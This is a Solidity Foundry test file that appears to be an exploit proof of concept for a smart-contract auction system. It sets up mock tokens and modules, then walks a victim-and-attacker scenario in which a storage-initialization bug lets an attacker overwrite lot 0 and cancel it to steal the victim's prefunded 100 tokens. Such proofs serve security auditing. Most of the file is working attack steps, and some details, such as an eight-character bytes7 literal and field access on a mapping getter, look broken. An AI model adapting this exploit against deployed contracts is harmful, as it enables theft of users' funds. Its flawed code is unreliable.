// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {Auction, AuctionModule} from "src/modules/Auction.sol";
import {Module, WithModules} from "src/modules/Modules.sol";
import {Keycode, Veecode} from "src/modules/Modules.sol";
import {Transfer} from "src/lib/Transfer.sol";
import {ICallback} from "src/interfaces/ICallback.sol";
import {Callbacks} from "src/lib/Callbacks.sol";
import {DerivativeModule} from "src/modules/Derivative.sol";

// Mock implementations for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockAuctionModule is AuctionModule {
    function TYPE() external pure override returns (Module.Type) {
        return Module.Type.Auction;
    }
    
    function VEECODE() external pure override returns (Veecode) {
        return Veecode.wrap(bytes7("AUCTION1"));
    }
    
    function auctionType() external pure override returns (Auction.AuctionType) {
        return Auction.AuctionType.English;
    }
    
    function auction(
        uint96 lotId_,
        Auction.AuctionParams calldata params_,
        uint8 quoteTokenDecimals_,
        uint8 baseTokenDecimals_
    ) external pure override returns (uint96 capacity) {
        return params_.capacity;
    }
    
    function cancelAuction(uint96 lotId_) external pure override {
        // Mock implementation
    }
}

contract TestAuctioneer is Auctioneer {
    constructor(address owner_) {}
    
    function _getModuleIfInstalled(Veecode veecode_) internal view override returns (address) {
        if (veecode_ == Veecode.wrap(bytes7("AUCTION1"))) {
            return address(mockAuctionModule);
        }
        return address(0);
    }
    
    function _getLatestModuleIfActive(Keycode keycode_) internal view override returns (address) {
        if (keycode_ == Keycode.wrap(bytes5("AUCT1"))) {
            return address(mockAuctionModule);
        }
        return address(0);
    }
    
    MockAuctionModule public mockAuctionModule;
    
    function setMockAuctionModule(address addr_) external {
        mockAuctionModule = MockAuctionModule(addr_);
    }
}

contract AuctioneerExploitTest is Test {
    TestAuctioneer auctioneer;
    MockERC20 baseToken;
    MockERC20 quoteToken;
    MockAuctionModule auctionModule;
    
    address victim = address(0x1);
    address attacker = address(0x2);
    
    event AuctionCreated(uint96 indexed lotId, Veecode indexed auctionRef, string infoHash);
    event AuctionCancelled(uint96 indexed lotId, Veecode indexed auctionRef);
    
    function setUp() public {
        // Deploy contracts
        auctioneer = new TestAuctioneer(address(this));
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        auctionModule = new MockAuctionModule();
        
        // Set up mock module
        auctioneer.setMockAuctionModule(address(auctionModule));
        
        // Mint tokens for testing
        baseToken.mint(victim, 1000 ether);
        baseToken.mint(attacker, 1000 ether);
        
        // Approve tokens
        vm.prank(victim);
        baseToken.approve(address(auctioneer), type(uint256).max);
        
        vm.prank(attacker);
        baseToken.approve(address(auctioneer), type(uint256).max);
    }
    
    function testExploit_StorageInitializationBug() public {
        // Step 1: Victim creates a prefunded auction with 100 tokens
        vm.startPrank(victim);
        
        Auctioneer.RoutingParams memory victimRouting = Auctioneer.RoutingParams({
            auctionType: Keycode.wrap(bytes5("AUCT1")),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // This requires pre-funding
        });
        
        Auction.AuctionParams memory victimParams = Auction.AuctionParams({
            capacity: 100 ether,
            capacityInQuote: false,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 hours,
            startPrice: 1 ether,
            reservePrice: 0.5 ether,
            minIncrement: 0.1 ether
        });
        
        // Victim creates auction - funds should go to lotRouting[0]
        uint96 victimLotId = auctioneer.auction(victimRouting, victimParams, "victim_info");
        
        // Verify victim's funds are stored (in lotRouting[0] due to bug)
        assertEq(baseToken.balanceOf(address(auctioneer)), 100 ether, "Auctioneer should hold victim's funds");
        
        vm.stopPrank();
        
        // Step 2: Attacker immediately creates their own auction (not prefunded)
        vm.startPrank(attacker);
        
        Auctioneer.RoutingParams memory attackerRouting = Auctioneer.RoutingParams({
            auctionType: Keycode.wrap(bytes5("AUCT1")),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: false  // No pre-funding required
        });
        
        Auction.AuctionParams memory attackerParams = Auction.AuctionParams({
            capacity: 50 ether,
            capacityInQuote: false,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 hours,
            startPrice: 1 ether,
            reservePrice: 0.5 ether,
            minIncrement: 0.1 ether
        });
        
        // Attacker creates auction - this overwrites lotRouting[0] with attacker as seller
        uint96 attackerLotId = auctioneer.auction(attackerRouting, attackerParams, "attacker_info");
        
        vm.stopPrank();
        
        // Step 3: Attacker cancels their auction to steal victim's funds
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBefore = baseToken.balanceOf(attacker);
        
        // Attacker cancels "their" auction (actually lotRouting[0] with victim's funds)
        auctioneer.cancel(0, "");  // Cancel lot ID 0 which contains victim's funds
        
        uint256 attackerBalanceAfter = baseToken.balanceOf(attacker);
        
        vm.stopPrank();
        
        // Verify exploit success
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            100 ether,
            "Attacker should have stolen victim's 100 tokens"
        );
        
        assertEq(
            baseToken.balanceOf(address(auctioneer)),
            0,
            "Auctioneer should have no funds left"
        );
        
        // The vulnerability is proven:
        // 1. Victim's prefunded funds were stored in lotRouting[0]
        // 2. Attacker's auction creation overwrote lotRouting[0] with attacker as seller
        // 3. Attacker canceled lot 0 and received victim's funds
    }
    
    function testDemonstrateStoragePointerBug() public {
        // This test demonstrates the root cause of the vulnerability
        
        vm.startPrank(victim);
        
        Auctioneer.RoutingParams memory routing = Auctioneer.RoutingParams({
            auctionType: Keycode.wrap(bytes5("AUCT1")),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: Keycode.wrap(bytes5("")),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true
        });
        
        Auction.AuctionParams memory params = Auction.AuctionParams({
            capacity: 100 ether,
            capacityInQuote: false,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 hours,
            startPrice: 1 ether,
            reservePrice: 0.5 ether,
            minIncrement: 0.1 ether
        });
        
        // Before creating auction, lotRouting[0] should be empty
        assertEq(auctioneer.lotRouting(0).seller, address(0), "lotRouting[0] should be empty initially");
        
        // Create auction
        uint96 lotId = auctioneer.auction(routing, params, "test");
        
        // After creation, lotRouting[0] should have the victim's data (due to bug)
        assertEq(auctioneer.lotRouting(0).seller, victim, "lotRouting[0] should have victim as seller");
        assertEq(auctioneer.lotRouting(0).funding, 100 ether, "lotRouting[0] should have victim's funding");
        
        // The actual lotId should be 0 (since lotCounter starts at 0 and increments)
        assertEq(lotId, 0, "First lotId should be 0");
        
        vm.stopPrank();
    }
}